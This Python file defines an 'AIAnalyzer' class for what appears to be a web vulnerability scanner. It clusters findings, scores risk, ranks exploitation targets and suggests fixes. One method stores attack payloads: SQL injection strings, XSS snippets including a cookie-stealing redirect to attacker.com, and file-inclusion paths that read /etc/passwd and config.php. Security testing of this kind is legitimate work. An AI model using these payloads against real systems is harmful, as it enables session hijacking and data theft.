#!/usr/bin/env python3

import json
import time
import hashlib
from datetime import datetime
from typing import List, Dict, Any

try:
    import numpy as np
    from sklearn.feature_extraction.text import TfidfVectorizer
    from sklearn.cluster import KMeans
    from sklearn.metrics.pairwise import cosine_similarity
    SKLEARN_AVAILABLE = True
except ImportError:
    SKLEARN_AVAILABLE = False
    print("Warning: scikit-learn not available. AI analysis will use basic algorithms.")

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    class Fore:
        RED = '\033[31m'
        GREEN = '\033[32m'
        YELLOW = '\033[33m'
        BLUE = '\033[34m'
        MAGENTA = '\033[35m'
        CYAN = '\033[36m'
        WHITE = '\033[37m'
        RESET = '\033[0m'
    
    class Style:
        BRIGHT = '\033[1m'
        RESET_ALL = '\033[0m'


class AIAnalyzer:
    """
    AI-powered vulnerability analysis and pattern recognition engine
    """
    
    def __init__(self, verbose=False):
        self.verbose = verbose
        self.vulnerability_patterns = self._load_vulnerability_patterns()
        self.attack_vectors = self._load_attack_vectors()
        self.cvss_weights = {
            'SQL Injection': 9.0,
            'Cross-Site Scripting (XSS)': 6.5,
            'Local File Inclusion (LFI)': 8.5,
            'Directory Traversal': 7.5,
            'Directory Listing': 5.0,
            'Information Disclosure': 3.0,
            'Sensitive File Exposure': 7.0
        }

    def _load_vulnerability_patterns(self):
        """
        Load vulnerability patterns for AI analysis
        """
        return {
            'sql_injection': {
                'keywords': ['mysql', 'oracle', 'postgresql', 'mssql', 'sqlite', 'odbc', 'query', 'database'],
                'error_patterns': ['syntax error', 'mysql_fetch', 'ora-', 'postgresql error', 'sql server'],
                'risk_indicators': ['union', 'select', 'drop', 'insert', 'update', 'delete']
            },
            'xss': {
                'keywords': ['script', 'alert', 'javascript', 'onclick', 'onerror', 'onload'],
                'contexts': ['html', 'attribute', 'javascript', 'css', 'url'],
                'payloads': ['<script>', '<img', 'javascript:', 'data:', 'vbscript:']
            },
            'file_inclusion': {
                'keywords': ['include', 'require', 'file', 'path', 'directory'],
                'indicators': ['../', '..\\', '/etc/', '/windows/', 'system32'],
                'files': ['passwd', 'hosts', 'config', 'web.config', '.htaccess']
            },
            'info_disclosure': {
                'headers': ['server', 'x-powered-by', 'x-aspnet-version', 'x-generator'],
                'files': ['robots.txt', 'sitemap.xml', '.git', '.env', 'backup'],
                'directories': ['admin', 'test', 'dev', 'staging', 'backup']
            }
        }

    def _load_attack_vectors(self):
        """
        Load common attack vectors and exploitation techniques
        """
        return {
            'SQL Injection': {
                'union_based': "UNION SELECT schema_name FROM information_schema.schemata",
                'boolean_based': "1' AND (SELECT COUNT(*) FROM users) > 0--",
                'time_based': "1'; WAITFOR DELAY '00:00:05'--",
                'error_based': "1' AND (SELECT * FROM (SELECT COUNT(*), CONCAT(version(), FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
            },
            'XSS': {
                'reflected': "<script>alert('Reflected XSS')</script>",
                'stored': "<script>document.location='http://attacker.com/'+document.cookie</script>",
                'dom_based': "javascript:alert('DOM XSS')",
                'filter_bypass': "<img src=x onerror=alert('Bypass')>"
            },
            'LFI': {
                'linux_passwd': "../../../etc/passwd",
                'windows_hosts': "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                'php_wrapper': "php://filter/convert.base64-encode/resource=config.php",
                'null_byte': "../../../etc/passwd%00.jpg"
            }
        }

    def analyze_vulnerabilities(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """
        Perform AI-powered analysis on discovered vulnerabilities
        """
        print(f"\n{Fore.MAGENTA}Zeus AI Analyzer Started{Style.RESET_ALL}")
        print(f"{Fore.BLUE}Analyzing {len(vulnerabilities)} vulnerabilities...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}{'='*80}{Style.RESET_ALL}\n")
        
        if not vulnerabilities:
            return {'analysis': 'No vulnerabilities to analyze', 'recommendations': []}
        
        analysis_results = {
            'vulnerability_clustering': self._cluster_vulnerabilities(vulnerabilities),
            'risk_assessment': self._assess_risk(vulnerabilities),
            'attack_chain_analysis': self._analyze_attack_chains(vulnerabilities),
            'exploitation_priority': self._prioritize_exploitation(vulnerabilities),
            'threat_modeling': self._generate_threat_model(vulnerabilities),
            'recommendations': self._generate_recommendations(vulnerabilities)
        }
        
        return analysis_results

    def _cluster_vulnerabilities(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """
        Cluster vulnerabilities using AI techniques
        """
        print(f"{Fore.BLUE}[AI] Clustering vulnerabilities...{Style.RESET_ALL}")
        
        if not SKLEARN_AVAILABLE:
            # Fallback to simple grouping
            clusters = {}
            for vuln in vulnerabilities:
                vuln_type = vuln.get('type', 'Unknown')
                if vuln_type not in clusters:
                    clusters[vuln_type] = []
                clusters[vuln_type].append(vuln)
            
            return {
                'method': 'simple_grouping',
                'clusters': clusters,
                'cluster_count': len(clusters)
            }
        
        # Advanced clustering with scikit-learn
        try:
            # Extract features for clustering
            features = []
            for vuln in vulnerabilities:
                feature_text = f"{vuln.get('type', '')} {vuln.get('url', '')} {vuln.get('parameter', '')}"
                features.append(feature_text)
            
            if len(features) < 2:
                return {'method': 'insufficient_data', 'clusters': {}}
            
            # Vectorize features
            vectorizer = TfidfVectorizer(max_features=100, stop_words='english')
            feature_matrix = vectorizer.fit_transform(features)
            
            # Determine optimal number of clusters
            n_clusters = min(len(vulnerabilities), max(2, len(vulnerabilities) // 3))
            
            # Perform clustering
            kmeans = KMeans(n_clusters=n_clusters, random_state=42, n_init=10)
            cluster_labels = kmeans.fit_predict(feature_matrix)
            
            # Organize results
            clusters = {}
            for i, vuln in enumerate(vulnerabilities):
                cluster_id = f"cluster_{cluster_labels[i]}"
                if cluster_id not in clusters:
                    clusters[cluster_id] = []
                clusters[cluster_id].append(vuln)
            
            return {
                'method': 'k_means',
                'clusters': clusters,
                'cluster_count': n_clusters,
                'silhouette_score': self._calculate_silhouette_score(feature_matrix, cluster_labels)
            }
            
        except Exception as e:
            print(f"{Fore.YELLOW}Clustering error: {e}, falling back to simple grouping{Style.RESET_ALL}")
            return self._cluster_vulnerabilities_simple(vulnerabilities)

    def _calculate_silhouette_score(self, feature_matrix, labels):
        """Calculate silhouette score for clustering quality"""
        try:
            from sklearn.metrics import silhouette_score
            if len(set(labels)) > 1:
                return float(silhouette_score(feature_matrix, labels))
        except:
            pass
        return 0.0

    def _assess_risk(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """
        Assess risk levels using AI-based scoring
        """
        print(f"{Fore.BLUE}[AI] Assessing risk levels...{Style.RESET_ALL}")
        
        risk_scores = []
        high_risk_count = 0
        medium_risk_count = 0
        low_risk_count = 0
        
        for vuln in vulnerabilities:
            base_score = self.cvss_weights.get(vuln.get('type'), 5.0)
            
            # Adjust score based on context
            context_multiplier = 1.0
            
            # Check for parameters (higher risk if vulnerable parameter exists)
            if vuln.get('parameter'):
                context_multiplier += 0.2
            
            # Check for authentication bypass indicators
            if any(keyword in str(vuln).lower() for keyword in ['admin', 'login', 'auth', 'session']):
                context_multiplier += 0.3
            
            # Check for data exposure
            if any(keyword in str(vuln).lower() for keyword in ['database', 'config', 'password', 'key']):
                context_multiplier += 0.4
            
            final_score = min(10.0, base_score * context_multiplier)
            risk_scores.append(final_score)
            
            if final_score >= 7.0:
                high_risk_count += 1
            elif final_score >= 4.0:
                medium_risk_count += 1
            else:
                low_risk_count += 1
        
        overall_risk = np.mean(risk_scores) if risk_scores else 0.0
        
        return {
            'overall_risk_score': float(overall_risk),
            'risk_distribution': {
                'high': high_risk_count,
                'medium': medium_risk_count,
                'low': low_risk_count
            },
            'individual_scores': risk_scores,
            'max_risk': float(max(risk_scores)) if risk_scores else 0.0,
            'risk_level': 'CRITICAL' if overall_risk >= 8.0 else 'HIGH' if overall_risk >= 6.0 else 'MEDIUM' if overall_risk >= 3.0 else 'LOW'
        }

    def _analyze_attack_chains(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """
        Analyze potential attack chains and exploitation paths
        """
        print(f"{Fore.BLUE}[AI] Analyzing attack chains...{Style.RESET_ALL}")
        
        attack_chains = []
        vuln_by_url = {}
        
        # Group vulnerabilities by URL
        for vuln in vulnerabilities:
            url = vuln.get('url', '')
            if url not in vuln_by_url:
                vuln_by_url[url] = []
            vuln_by_url[url].append(vuln)
        
        # Identify potential attack chains
        for url, url_vulns in vuln_by_url.items():
            if len(url_vulns) > 1:
                chain = {
                    'url': url,
                    'vulnerabilities': url_vulns,
                    'chain_strength': len(url_vulns),
                    'exploitation_path': self._generate_exploitation_path(url_vulns)
                }
                attack_chains.append(chain)
        
        # Identify cross-vulnerability exploitation opportunities
        exploitation_opportunities = []
        
        sql_vulns = [v for v in vulnerabilities if 'SQL' in v.get('type', '')]
        xss_vulns = [v for v in vulnerabilities if 'XSS' in v.get('type', '')]
        file_vulns = [v for v in vulnerabilities if 'File' in v.get('type', '') or 'Directory' in v.get('type', '')]
        
        if sql_vulns and xss_vulns:
            exploitation_opportunities.append({
                'type': 'SQL + XSS Combination',
                'description': 'SQL injection for data extraction combined with XSS for session hijacking',
                'severity': 'CRITICAL',
                'sql_targets': len(sql_vulns),
                'xss_targets': len(xss_vulns)
            })
        
        if file_vulns and sql_vulns:
            exploitation_opportunities.append({
                'type': 'File Access + SQL Injection',
                'description': 'File inclusion to access configuration files, SQL injection for database access',
                'severity': 'HIGH',
                'file_targets': len(file_vulns),
                'sql_targets': len(sql_vulns)
            })
        
        return {
            'attack_chains': attack_chains,
            'chain_count': len(attack_chains),
            'exploitation_opportunities': exploitation_opportunities,
            'multi_vulnerability_targets': len([url for url, vulns in vuln_by_url.items() if len(vulns) > 1])
        }

    def _generate_exploitation_path(self, vulnerabilities: List[Dict]) -> List[str]:
        """
        Generate step-by-step exploitation path
        """
        path = []
        
        # Sort vulnerabilities by severity for optimal exploitation order
        severity_order = {'HIGH': 3, 'MEDIUM': 2, 'LOW': 1}
        sorted_vulns = sorted(vulnerabilities, key=lambda v: severity_order.get(v.get('severity', 'LOW'), 1), reverse=True)
        
        for i, vuln in enumerate(sorted_vulns, 1):
            step = f"Step {i}: Exploit {vuln.get('type', 'Unknown')} vulnerability"
            if vuln.get('parameter'):
                step += f" via parameter '{vuln.get('parameter')}'"
            path.append(step)
        
        return path

    def _prioritize_exploitation(self, vulnerabilities: List[Dict]) -> List[Dict]:
        """
        Prioritize vulnerabilities for exploitation based on AI analysis
        """
        print(f"{Fore.BLUE}[AI] Prioritizing exploitation targets...{Style.RESET_ALL}")
        
        prioritized = []
        
        for vuln in vulnerabilities:
            priority_score = 0
            
            # Base severity score
            severity_scores = {'HIGH': 100, 'MEDIUM': 60, 'LOW': 20}
            priority_score += severity_scores.get(vuln.get('severity', 'LOW'), 20)
            
            # Vulnerability type bonus
            type_bonuses = {
                'SQL Injection': 50,
                'Local File Inclusion (LFI)': 40,
                'Directory Traversal': 35,
                'Cross-Site Scripting (XSS)': 30,
                'Sensitive File Exposure': 25,
                'Directory Listing': 15,
                'Information Disclosure': 10
            }
            priority_score += type_bonuses.get(vuln.get('type', ''), 0)
            
            # Context bonuses
            if vuln.get('parameter'):
                priority_score += 20  # Parameterized vulnerabilities are easier to exploit
            
            if any(keyword in str(vuln).lower() for keyword in ['admin', 'config', 'database']):
                priority_score += 30  # High-value targets
            
            vuln_copy = vuln.copy()
            vuln_copy['exploitation_priority'] = priority_score
            prioritized.append(vuln_copy)
        
        # Sort by priority score
        prioritized.sort(key=lambda v: v['exploitation_priority'], reverse=True)
        
        return prioritized

    def _generate_threat_model(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """
        Generate threat model based on discovered vulnerabilities
        """
        print(f"{Fore.BLUE}[AI] Generating threat model...{Style.RESET_ALL}")
        
        threat_actors = []
        attack_scenarios = []
        
        # Identify potential threat actors based on vulnerabilities
        if any('SQL' in v.get('type', '') for v in vulnerabilities):
            threat_actors.append({
                'type': 'Database Attacker',
                'motivation': 'Data theft, financial gain',
                'capabilities': 'SQL injection expertise, database knowledge',
                'likely_targets': [v for v in vulnerabilities if 'SQL' in v.get('type', '')]
            })
        
        if any('XSS' in v.get('type', '') for v in vulnerabilities):
            threat_actors.append({
                'type': 'Client-side Attacker',
                'motivation': 'Session hijacking, malware distribution',
                'capabilities': 'JavaScript expertise, social engineering',
                'likely_targets': [v for v in vulnerabilities if 'XSS' in v.get('type', '')]
            })
        
        if any('File' in v.get('type', '') or 'Directory' in v.get('type', '') for v in vulnerabilities):
            threat_actors.append({
                'type': 'System Intruder',
                'motivation': 'System access, privilege escalation',
                'capabilities': 'File system knowledge, path traversal techniques',
                'likely_targets': [v for v in vulnerabilities if 'File' in v.get('type', '') or 'Directory' in v.get('type', '')]
            })
        
        # Generate attack scenarios
        high_severity_vulns = [v for v in vulnerabilities if v.get('severity') == 'HIGH']
        if high_severity_vulns:
            attack_scenarios.append({
                'scenario': 'Direct Exploitation',
                'description': 'Attacker directly exploits high-severity vulnerabilities for immediate access',
                'probability': 'HIGH',
                'impact': 'SEVERE',
                'vulnerabilities_used': len(high_severity_vulns)
            })
        
        if len(vulnerabilities) > 3:
            attack_scenarios.append({
                'scenario': 'Multi-stage Attack',
                'description': 'Attacker chains multiple vulnerabilities for comprehensive system compromise',
                'probability': 'MEDIUM',
                'impact': 'CRITICAL',
                'vulnerabilities_used': len(vulnerabilities)
            })
        
        return {
            'threat_actors': threat_actors,
            'attack_scenarios': attack_scenarios,
            'overall_threat_level': self._calculate_threat_level(vulnerabilities),
            'recommended_defenses': self._recommend_defenses(vulnerabilities)
        }

    def _calculate_threat_level(self, vulnerabilities: List[Dict]) -> str:
        """Calculate overall threat level"""
        high_count = len([v for v in vulnerabilities if v.get('severity') == 'HIGH'])
        medium_count = len([v for v in vulnerabilities if v.get('severity') == 'MEDIUM'])
        
        if high_count >= 3:
            return 'CRITICAL'
        elif high_count >= 1 or medium_count >= 3:
            return 'HIGH'
        elif medium_count >= 1:
            return 'MEDIUM'
        else:
            return 'LOW'

    def _recommend_defenses(self, vulnerabilities: List[Dict]) -> List[str]:
        """Recommend defensive measures"""
        defenses = set()
        
        for vuln in vulnerabilities:
            vuln_type = vuln.get('type', '')
            
            if 'SQL' in vuln_type:
                defenses.add('Implement parameterized queries and input validation')
                defenses.add('Use database firewalls and monitoring')
            
            if 'XSS' in vuln_type:
                defenses.add('Implement Content Security Policy (CSP)')
                defenses.add('Use output encoding and input sanitization')
            
            if 'File' in vuln_type or 'Directory' in vuln_type:
                defenses.add('Restrict file access permissions')
                defenses.add('Implement path traversal protection')
            
            if 'Information Disclosure' in vuln_type:
                defenses.add('Configure server headers properly')
                defenses.add('Disable directory listing')
        
        return list(defenses)

    def _generate_recommendations(self, vulnerabilities: List[Dict]) -> List[Dict]:
        """
        Generate AI-powered remediation recommendations
        """
        recommendations = []
        
        # Group vulnerabilities by type for targeted recommendations
        vuln_types = {}
        for vuln in vulnerabilities:
            vuln_type = vuln.get('type', 'Unknown')
            if vuln_type not in vuln_types:
                vuln_types[vuln_type] = []
            vuln_types[vuln_type].append(vuln)
        
        for vuln_type, type_vulns in vuln_types.items():
            if 'SQL Injection' in vuln_type:
                recommendations.append({
                    'vulnerability_type': vuln_type,
                    'priority': 'CRITICAL',
                    'affected_count': len(type_vulns),
                    'remediation_steps': [
                        'Implement parameterized queries/prepared statements',
                        'Use stored procedures with proper input validation',
                        'Apply input sanitization and validation',
                        'Implement least privilege database access',
                        'Deploy Web Application Firewall (WAF)',
                        'Regular security testing and code review'
                    ],
                    'testing_recommendations': [
                        'Use automated SQL injection scanners',
                        'Perform manual penetration testing',
                        'Implement continuous security monitoring'
                    ]
                })
            
            elif 'XSS' in vuln_type:
                recommendations.append({
                    'vulnerability_type': vuln_type,
                    'priority': 'HIGH',
                    'affected_count': len(type_vulns),
                    'remediation_steps': [
                        'Implement Content Security Policy (CSP)',
                        'Use output encoding for all user input',
                        'Validate and sanitize input data',
                        'Use HTTPOnly and Secure cookie flags',
                        'Implement proper session management'
                    ],
                    'testing_recommendations': [
                        'Use XSS detection tools',
                        'Manual payload testing',
                        'Browser-based security testing'
                    ]
                })
            
            elif 'File Inclusion' in vuln_type or 'Directory Traversal' in vuln_type:
                recommendations.append({
                    'vulnerability_type': vuln_type,
                    'priority': 'HIGH',
                    'affected_count': len(type_vulns),
                    'remediation_steps': [
                        'Implement path traversal protection',
                        'Use whitelisting for allowed files/directories',
                        'Restrict file system permissions',
                        'Avoid user-controlled file paths',
                        'Use secure file handling functions'
                    ],
                    'testing_recommendations': [
                        'Directory traversal testing',
                        'File inclusion payload testing',
                        'Permission and access control review'
                    ]
                })
        
        return recommendations

    def generate_analysis_report(self, analysis_results: Dict[str, Any], target_url: str) -> Dict[str, Any]:
        """
        Generate comprehensive AI analysis report
        """
        report = {
            'target': target_url,
            'analysis_timestamp': time.time(),
            'analysis_date': datetime.now().isoformat(),
            'ai_engine_version': '1.0.0',
            'analysis_results': analysis_results,
            'summary': {
                'total_vulnerabilities_analyzed': len(analysis_results.get('exploitation_priority', [])),
                'risk_level': analysis_results.get('risk_assessment', {}).get('risk_level', 'UNKNOWN'),
                'threat_level': analysis_results.get('threat_modeling', {}).get('overall_threat_level', 'UNKNOWN'),
                'exploitation_targets': len([v for v in analysis_results.get('exploitation_priority', []) if v.get('exploitation_priority', 0) > 80]),
                'recommendations_count': len(analysis_results.get('recommendations', []))
            }
        }
        
        return report